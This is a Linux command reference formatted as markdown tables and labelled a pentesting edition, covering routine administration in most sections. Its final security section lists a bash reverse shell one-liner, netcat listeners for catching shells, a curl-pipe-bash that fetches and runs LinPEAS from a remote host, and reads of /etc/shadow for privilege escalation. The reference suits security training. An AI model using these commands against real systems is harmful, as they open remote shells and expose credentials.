# LINUX COMMAND REFERENCE GUIDE
### Pentesting & Security Engineering Edition
### 17 Sections · 180+ Commands

---

## 01  ACCESS & HELP

| Command | Description |
|---------|-------------|
| `sudo <cmd>` | Run command with elevated (root) privileges |
| `su` | Switch user — defaults to root if no user specified |
| `man <cmd>` | Full manual page for a command |
| `info <cmd>` | Detailed GNU documentation (often more than man) |
| `tldr <cmd>` | Practical, short examples (install: npm i -g tldr) |
| `whatis <cmd>` | One-line summary of what a command does |

---

## 02  IDENTITY & SYSTEM INFO

| Command | Description |
|---------|-------------|
| `whoami` | Print the current logged-in username |
| `who` | List all users currently logged in |
| `w` | Who is logged in and what they are running |
| `last` | Login history (reads /var/log/wtmp) |
| `id` | Show UID, GID, and all group memberships |
| `groups` | List groups the current user belongs to |
| `hostname` | Print the system hostname |
| `uname -a` | Kernel version, architecture, and system details |
| `lscpu` | CPU architecture, cores, and features |
| `free -h` | RAM and swap usage in human-readable format |
| `uptime` | System uptime and 1/5/15-min load averages |
| `echo "text"` | Print text or expand a variable to stdout |
| `date` | Current date and time |
| `cal` | Display a calendar in the terminal |

---

## 03  NAVIGATION & FILE BASICS

| Command | Description |
|---------|-------------|
| `pwd` | Print current working directory (absolute path) |
| `cd <dir>` | Change into a directory |
| `cd -` | Jump back to the previous directory |
| `ls` | List files and directories in current location |
| `ls -lah` | Detailed list with hidden files and human-readable sizes |
| `clear` | Clear the terminal screen (or Ctrl+L) |

---

## 04  FILE & DIRECTORY OPERATIONS

| Command | Description |
|---------|-------------|
| `cat <file>` | Print full file content to stdout |
| `less <file>` | View file page by page (q to quit, / to search) |
| `head -n 20 <file>` | Print the first 20 lines of a file |
| `tail -n 20 <file>` | Print the last 20 lines of a file |
| `tail -f <file>` | Follow a file in real time (great for logs) |
| `touch <file>` | Create an empty file or update its timestamp |
| `mkdir <dir>` | Create a new directory |
| `mkdir -p a/b/c` | Create nested directories in one command |
| `mktemp` | Create a unique temporary file in /tmp |
| `mktemp -d` | Create a unique temporary directory in /tmp |
| `cp src dst` | Copy a file from source to destination |
| `cp -r src dst` | Copy a directory and all its contents recursively |
| `mv old new` | Move or rename a file or directory |
| `rm <file>` | Delete a file (no trash — permanent) |
| `rm -r <dir>` | Delete a directory and all its contents recursively |
| `rmdir <dir>` | Remove an empty directory |
| `ln src dst` | Create a hard link pointing to source |
| `ln -s src dst` | Create a symbolic (soft) link |
| `stat <file>` | Show detailed metadata: size, timestamps, inode, permissions |
| `file <file>` | Detect and display the actual file type |
| `realpath <file>` | Resolve and print the absolute path |
| `wc -l <file>` | Count the number of lines in a file |

---

## 05  SEARCH & DISCOVERY

| Command | Description |
|---------|-------------|
| `find /path -name "name"` | Search for files by name under a directory |
| `find /path -type f -name "*.log"` | Find all .log files recursively |
| `find . -type f -mtime -1` | Files modified in the last 24 hours |
| `find / -perm -4000 2>/dev/null` | Find all SUID binaries (privesc relevant) |
| `locate <name>` | Fast indexed search using pre-built database |
| `updatedb` | Refresh the locate database (run as root) |
| `whereis <cmd>` | Find the binary, source, and man page of a command |
| `which <cmd>` | Show the full path of a command in your $PATH |
| `grep "pattern" <file>` | Search for a pattern inside a file |
| `grep -Rin "pattern" /path` | Recursive, case-insensitive search with line numbers |
| `grep -l "pattern" /path/*` | Print only filenames that contain the match |
| `grep -v "pattern" <file>` | Print lines that do NOT match the pattern |
| `grep -E "err\|fail\|deny" <file>` | Extended regex: match any of multiple patterns |
| `grep -A 3 -B 3 "pattern" <file>` | Show 3 lines before and after each match |

---

## 06  TEXT PROCESSING

| Command | Description |
|---------|-------------|
| `awk -F: '{print $1}' /etc/passwd` | Extract first colon-delimited field from each line |
| `awk '{print $NF}' <file>` | Print the last field on each line |
| `sed 's/old/new/g' <file>` | Replace all occurrences of old with new |
| `cut -d: -f1 /etc/passwd` | Cut the first column using colon as delimiter |
| `sort <file>` | Sort lines alphabetically |
| `sort -n <file>` | Sort lines numerically |
| `sort <file> \| uniq -c` | Sort and count duplicate lines |
| `tr '[:lower:]' '[:upper:]'` | Convert lowercase input to uppercase |
| `xargs` | Build command lines from stdin (pipe-friendly) |
| `tee <file>` | Write stdin to both a file and stdout simultaneously |
| `diff file1 file2` | Show line-by-line differences between two files |
| `diff -u file1 file2` | Unified diff — easier to read (used in patches) |
| `column -t <file>` | Align whitespace-separated output into clean columns |
| `paste file1 file2` | Merge two files side by side, tab-separated |

---

## 07  PACKAGE MANAGEMENT

| Command | Description |
|---------|-------------|
| `apt update` | Refresh the package index from repositories |
| `apt upgrade` | Upgrade all installed packages to latest versions |
| `apt install <pkg>` | Install a package (Debian / Ubuntu / Kali) |
| `apt remove <pkg>` | Remove a package (keeps config files) |
| `apt purge <pkg>` | Remove package and its configuration files |
| `dpkg -l \| grep <pkg>` | Check if a specific Debian package is installed |
| `dnf install <pkg>` | Install a package (RHEL / Fedora / CentOS) |
| `dnf upgrade` | Upgrade all packages (RHEL / Fedora) |
| `rpm -qa \| grep <pkg>` | Check if an RPM package is installed |

---

## 08  DISK & FILESYSTEM

| Command | Description |
|---------|-------------|
| `df -h` | Show mounted filesystem usage in human-readable format |
| `df -i` | Show inode usage (useful when disk is "full" with no space issue) |
| `du -sh <path>` | Show total size of a directory or file |
| `lsblk -f` | List block devices with filesystem type and UUID |
| `mount` | List all currently mounted filesystems |
| `umount /mountpoint` | Unmount a filesystem |
| `blkid` | Show UUID and filesystem type of all block devices |
| `ncdu` | Interactive disk usage viewer (navigate with arrow keys) |
| `duf` | Modern, colorized disk usage summary |

---

## 09  PROCESSES & PERFORMANCE

| Command | Description |
|---------|-------------|
| `ps` | Snapshot of processes for the current terminal session |
| `ps aux` | Full list of all running processes from all users |
| `top` | Real-time process monitor (q to quit) |
| `htop` | Interactive process viewer — better than top |
| `kill <PID>` | Send the default SIGTERM signal to a process |
| `kill -15 <PID>` | Graceful stop — allows cleanup before exit (SIGTERM) |
| `kill -9 <PID>` | Force-kill immediately — no cleanup (SIGKILL) |
| `kill -1 <PID>` | Reload config without restarting (SIGHUP) |
| `kill -19 <PID>` | Pause a process (SIGSTOP) |
| `kill -18 <PID>` | Resume a paused process (SIGCONT) |
| `pgrep <name>` | Find PID(s) of processes matching a name |
| `pkill <name>` | Kill all processes matching a name |
| `nice -n 10 <cmd>` | Start a command with lower CPU priority |
| `renice -n -5 -p <PID>` | Adjust CPU priority of a running process (root needed for negative) |
| `watch -n 2 <cmd>` | Repeat a command every 2 seconds and display output |
| `lsof -i :<port>` | List which process is using a specific port |
| `lsof -p <PID>` | List all files and sockets opened by a process |
| `strace -p <PID>` | Trace system calls made by a running process |
| `ltrace <cmd>` | Trace library calls made by a command |
| `vmstat 1 5` | CPU / memory / process statistics sampled every second |
| `iostat -x 1` | Extended disk I/O statistics per second |

---

## 10  USERS, GROUPS & PERMISSIONS

| Command | Description |
|---------|-------------|
| `useradd <user>` | Create a new user account |
| `usermod -aG <group> <user>` | Add an existing user to a group |
| `userdel -r <user>` | Delete a user and remove their home directory |
| `passwd <user>` | Set or change a user's password |
| `chmod 755 <file>` | Set permissions: owner rwx, group r-x, others r-x |
| `chmod +x <file>` | Make a file executable for all users |
| `chown user:group <file>` | Change file owner and group |
| `chgrp <group> <file>` | Change only the group of a file |
| `umask` | Show or set the default permission mask for new files |
| `sudo -l` | List what sudo commands the current user can run |
| `visudo` | Safely edit the /etc/sudoers file with syntax checking |
| `getfacl <file>` | Show extended ACL permissions on a file |
| `setfacl -m u:user:rwx <file>` | Grant a specific user rwx via ACL (bypasses standard perms) |

---

## 11  NETWORKING

| Command | Description |
|---------|-------------|
| `ip addr` | Show all network interfaces and their IP addresses |
| `ip route` | Display the kernel routing table |
| `ping -c 4 <host>` | Send 4 ICMP packets to test connectivity |
| `traceroute <host>` | Show the route and hops packets take to reach a host |
| `dig <domain> +short` | DNS lookup — returns just the answer |
| `nslookup <domain>` | Interactive DNS query tool |
| `ss -tulnp` | Show all listening ports with process info (replaces netstat) |
| `netstat -tulnp` | Older alternative to ss — still common on target systems |
| `curl -I https://example.com` | Fetch HTTP response headers only |
| `curl -X POST -d "data" <URL>` | Send a POST request with form data |
| `wget <URL>` | Download a file from a URL |
| `tcpdump -ni any port 53` | Capture DNS packets on all interfaces |
| `nmap -sV -sC <target>` | Service version detection + default scripts scan |
| `nmap -p- <target>` | Scan all 65535 ports on a target |
| `nmap -O <target>` | OS detection scan (requires root) |
| `nc -lvnp <port>` | Listen for incoming connections (catch reverse shells) |
| `nc <host> <port>` | Connect to a host:port (banner grab / basic test) |

---

## 12  REMOTE ACCESS & TRANSFER

| Command | Description |
|---------|-------------|
| `ssh user@host` | Log in to a remote machine via SSH |
| `ssh -i key.pem user@host` | Log in using a private key file |
| `ssh -L 8080:localhost:80 user@host` | Local port forwarding (tunnel remote port to local) |
| `ssh -R 9090:localhost:80 user@host` | Remote port forwarding (expose local port on remote) |
| `scp <file> user@host:/path` | Copy a file to a remote machine over SSH |
| `rsync -avz --dry-run src/ user@host:/dst/` | Preview a sync without making changes |
| `rsync -avz src/ user@host:/dst/` | Sync a directory to remote (only transfers changes) |

---

## 13  SERVICES & LOGS

| Command | Description |
|---------|-------------|
| `systemctl status <service>` | Check if a service is running, its logs, and its state |
| `systemctl enable --now <service>` | Enable a service to start at boot and start it immediately |
| `systemctl stop <service>` | Stop a running service |
| `systemctl restart <service>` | Restart a service (stop then start) |
| `systemctl list-units --type=service --state=running` | List all currently running services |
| `journalctl -xe` | View recent important system log entries |
| `journalctl -u ssh -b` | View SSH service logs since last boot |
| `journalctl --since "1 hour ago"` | Filter logs to the past hour |

---

## 14  ARCHIVES & INTEGRITY

| Command | Description |
|---------|-------------|
| `tar -czvf backup.tar.gz <dir>/` | Create a gzip-compressed archive of a directory |
| `tar -xzvf backup.tar.gz` | Extract a .tar.gz archive |
| `gzip <file>` | Compress a file with gzip (replaces original) |
| `gunzip <file>.gz` | Decompress a gzip file |
| `xz <file>` | Compress with xz (better compression ratio than gzip) |
| `unxz <file>.xz` | Decompress an xz file |
| `sha256sum <file>` | Generate and verify a SHA-256 checksum |
| `md5sum <file>` | Generate an MD5 checksum (fast, not cryptographically secure) |

---

## 15  SCHEDULING & HISTORY

| Command | Description |
|---------|-------------|
| `history` | Print your command history |
| `!!` | Re-run the previous command |
| `!<n>` | Re-run command number n from history |
| `Ctrl+R` | Reverse-search through command history interactively |
| `crontab -e` | Edit your personal cron jobs |
| `crontab -l` | List your current cron jobs |
| `at 10:30` | Schedule a one-time job to run at 10:30 |
| `systemctl list-timers` | List all systemd timer units and their next trigger times |

---

## 16  ENVIRONMENT & SHELL

| Command | Description |
|---------|-------------|
| `env` | Print all environment variables |
| `printenv <VAR>` | Print the value of a specific variable |
| `export VAR=value` | Set and export an environment variable for child processes |
| `unset <VAR>` | Remove a variable from the environment |
| `echo $PATH` | View the current executable search path |
| `export PATH=$PATH:/new/dir` | Add a directory to your PATH |
| `alias ll='ls -lah'` | Create a shortcut command |
| `unalias ll` | Remove an alias |
| `source ~/.bashrc` | Reload your shell config without opening a new terminal |
| `. ~/.bashrc` | Same as source — POSIX-compatible shorthand |
| `bash -x script.sh` | Run a script in debug mode — traces every executed line |
| `set -e` | Exit the script immediately if any command returns non-zero |
| `set -u` | Treat references to undefined variables as errors |

---

## 17  SECURITY & PENTESTING

| Command | Description |
|---------|-------------|
| `find / -perm -4000 2>/dev/null` | Find all SUID binaries — common privesc starting point |
| `find / -perm -2000 2>/dev/null` | Find all SGID binaries |
| `find / -writable -type f 2>/dev/null` | Find all world-writable files |
| `cat /etc/passwd` | List all user accounts on the system |
| `cat /etc/shadow` | Read password hashes (requires root) |
| `cat /etc/crontab` | Read system-wide cron jobs for privesc paths |
| `sudo -l` | List sudo privileges — check for NOPASSWD entries |
| `ss -tulnp` | Find open ports and services running locally |
| `ps auxf` | Full process tree — spot unusual running processes |
| `env` | Dump environment variables — may leak secrets or paths |
| `strace -e trace=file <cmd>` | Trace all file access by a command |
| `ltrace <cmd>` | Trace library calls — useful for binary analysis |
| `strings <binary>` | Extract human-readable strings from a binary |
| `file <binary>` | Check binary type: ELF, 32/64-bit, stripped or not |
| `xxd <file> \| head` | Hex dump the first bytes of a file |
| `nc -lvnp 4444` | Open a listener to catch reverse shells |
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Basic bash reverse shell one-liner |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade a dumb shell to interactive TTY |
| `curl -s http://<ip>/linpeas.sh \| bash` | Run LinPEAS directly from a remote server |s